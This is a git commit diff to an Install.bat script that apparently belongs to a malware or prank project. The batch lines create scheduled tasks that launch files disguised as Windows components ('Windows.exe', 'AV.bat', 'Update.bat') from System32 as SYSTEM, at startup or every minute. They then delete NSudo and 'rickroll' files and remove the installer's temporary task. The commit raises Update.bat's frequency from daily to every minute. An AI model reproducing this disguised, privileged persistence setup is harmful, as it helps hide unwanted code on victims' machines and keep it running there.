2497b15b2f88ecacd0ae4216246e96bcefaf42de
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-06 21:05:18 -0400

    Update Install.bat

--- install/Install.bat
+++ install/Install.bat
@@ -34,7 +34,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Remove
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe"
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del /f rickroll.*
 del /f NSudo.exe
 powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
